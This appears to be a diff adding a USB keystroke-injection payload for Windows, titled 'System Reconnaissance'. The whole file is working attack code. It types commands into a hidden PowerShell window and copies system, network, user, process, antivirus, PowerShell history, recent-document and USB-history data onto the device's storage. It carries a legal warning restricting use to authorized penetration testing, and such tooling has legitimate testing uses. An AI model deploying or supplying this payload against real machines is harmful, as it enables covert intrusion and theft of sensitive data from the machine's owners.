@@ -1,0 +1,138 @@
+#!/bin/bash
+# Title:         System Reconnaissance
+# Description:   Comprehensive system enumeration for authorized penetration testing
+# Author:        David Osisek (CamoZeroDay)
+# Version:       1.0
+# Category:      Enumeration
+# Target:        Windows 8/10/11
+# Attackmodes:   HID, Storage
+
+# ⚠️ LEGAL WARNING ⚠️
+# This payload is for AUTHORIZED PENETRATION TESTING ONLY
+# Unauthorized use is a federal crime (18 U.S.C. § 1030)
+# See LEGAL_DISCLAIMER.md for full details
+
+##############################################
+# CONFIGURATION
+##############################################
+
+LOOT_DIR=/root/loot/system-recon
+LED_SETUP="G B 1000"
+LED_ATTACK="B FAST"
+LED_FINISH="G SOLID"
+LED_FAIL="R SLOW"
+
+##############################################
+# ATTACK PHASES
+##############################################
+
+function run() {
+    # Phase 1: Initialize
+    LED $LED_SETUP
+    ATTACKMODE HID STORAGE
+    Q DELAY 2000
+
+    # Phase 2: Open PowerShell
+    Q GUI r
+    Q DELAY 500
+    Q STRING "powershell -WindowStyle Hidden"
+    Q ENTER
+    Q DELAY 1000
+
+    # Phase 3: System Reconnaissance Script
+    LED $LED_ATTACK
+    
+    Q STRING "\$outPath='$MOUNT_POINT\\recon-'+\$env:COMPUTERNAME+'-'+(Get-Date -Format 'yyyyMMdd-HHmmss')+'.txt';"
+    Q STRING "function Write-Section {\$args[0] | Out-File -Append -FilePath \$outPath;};"
+    
+    # Header
+    Q STRING "Write-Section '=============================================='; Write-Section 'SYSTEM RECONNAISSANCE REPORT'; Write-Section 'Generated: '+(Get-Date); Write-Section '==============================================';"
+    
+    # Basic System Info
+    Q STRING "Write-Section ''; Write-Section '[SYSTEM INFORMATION]'; systeminfo | Out-File -Append -FilePath \$outPath;"
+    
+    # Network Configuration
+    Q STRING "Write-Section ''; Write-Section '[NETWORK CONFIGURATION]'; ipconfig /all | Out-File -Append -FilePath \$outPath;"
+    
+    # Network Adapters
+    Q STRING "Write-Section ''; Write-Section '[NETWORK ADAPTERS]'; Get-NetAdapter | Format-List | Out-File -Append -FilePath \$outPath;"
+    
+    # Routing Table
+    Q STRING "Write-Section ''; Write-Section '[ROUTING TABLE]'; route print | Out-File -Append -FilePath \$outPath;"
+    
+    # ARP Cache
+    Q STRING "Write-Section ''; Write-Section '[ARP CACHE]'; arp -a | Out-File -Append -FilePath \$outPath;"
+    
+    # Active Connections
+    Q STRING "Write-Section ''; Write-Section '[ACTIVE CONNECTIONS]'; netstat -ano | Out-File -Append -FilePath \$outPath;"
+    
+    # DNS Cache
+    Q STRING "Write-Section ''; Write-Section '[DNS CACHE]'; ipconfig /displaydns | Out-File -Append -FilePath \$outPath;"
+    
+    # Running Processes
+    Q STRING "Write-Section ''; Write-Section '[RUNNING PROCESSES]'; Get-Process | Sort-Object CPU -Descending | Select-Object -First 50 | Format-Table | Out-File -Append -FilePath \$outPath;"
+    
+    # Installed Software
+    Q STRING "Write-Section ''; Write-Section '[INSTALLED SOFTWARE]'; Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName,DisplayVersion,Publisher | Out-File -Append -FilePath \$outPath;"
+    
+    # Environment Variables
+    Q STRING "Write-Section ''; Write-Section '[ENVIRONMENT VARIABLES]'; Get-ChildItem Env: | Out-File -Append -FilePath \$outPath;"
+    
+    # User Information
+    Q STRING "Write-Section ''; Write-Section '[CURRENT USER]'; whoami /all | Out-File -Append -FilePath \$outPath;"
+    
+    # Local Users
+    Q STRING "Write-Section ''; Write-Section '[LOCAL USERS]'; net user | Out-File -Append -FilePath \$outPath;"
+    
+    # Local Groups
+    Q STRING "Write-Section ''; Write-Section '[LOCAL GROUPS]'; net localgroup | Out-File -Append -FilePath \$outPath;"
+    
+    # Domain Information (if domain-joined)
+    Q STRING "Write-Section ''; Write-Section '[DOMAIN INFORMATION]'; try {nltest /domain_trusts | Out-File -Append -FilePath \$outPath} catch {};"
+    
+    # Scheduled Tasks
+    Q STRING "Write-Section ''; Write-Section '[SCHEDULED TASKS]'; schtasks /query /fo LIST /v | Out-File -Append -FilePath \$outPath;"
+    
+    # Services
+    Q STRING "Write-Section ''; Write-Section '[RUNNING SERVICES]'; Get-Service | Where-Object {-Status -eq 'Running'} | Format-Table | Out-File -Append -FilePath \$outPath;"
+    
+    # Startup Programs
+    Q STRING "Write-Section ''; Write-Section '[STARTUP PROGRAMS]'; Get-CimInstance Win32_StartupCommand | Select-Object Name,Command,Location | Format-List | Out-File -Append -FilePath \$outPath;"
+    
+    # Firewall Rules
+    Q STRING "Write-Section ''; Write-Section '[FIREWALL STATUS]'; netsh advfirewall show allprofiles | Out-File -Append -FilePath \$outPath;"
+    
+    # Shares
+    Q STRING "Write-Section ''; Write-Section '[NETWORK SHARES]'; net share | Out-File -Append -FilePath \$outPath;"
+    
+    # PowerShell History
+    Q STRING "Write-Section ''; Write-Section '[POWERSHELL HISTORY]'; try {Get-Content (Get-PSReadlineOption).HistorySavePath | Out-File -Append -FilePath \$outPath} catch {};"
+    
+    # Antivirus
+    Q STRING "Write-Section ''; Write-Section '[ANTIVIRUS]'; Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Out-File -Append -FilePath \$outPath;"
+    
+    # Windows Defender Status
+    Q STRING "Write-Section ''; Write-Section '[WINDOWS DEFENDER]'; Get-MpComputerStatus | Out-File -Append -FilePath \$outPath;"
+    
+    # Recent Documents
+    Q STRING "Write-Section ''; Write-Section '[RECENT DOCUMENTS]'; Get-ChildItem \$env:APPDATA\\Microsoft\\Windows\\Recent\\ | Select-Object Name,LastWriteTime | Out-File -Append -FilePath \$outPath;"
+    
+    # USB History
+    Q STRING "Write-Section ''; Write-Section '[USB DEVICE HISTORY]'; Get-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR\\*\\*' | Select-Object FriendlyName,Mfg | Out-File -Append -FilePath \$outPath;"
+    
+    # Completion
+    Q STRING "Write-Section ''; Write-Section '=============================================='; Write-Section 'RECONNAISSANCE COMPLETE'; Write-Section '==============================================';"
+    Q ENTER
+    
+    # Phase 4: Cleanup and Exit
+    Q DELAY 3000
+    Q STRING "exit"
+    Q ENTER
+
+    # Phase 5: Finish
+    LED $LED_FINISH
+    sync
+}
+
+# Execute attack
+run
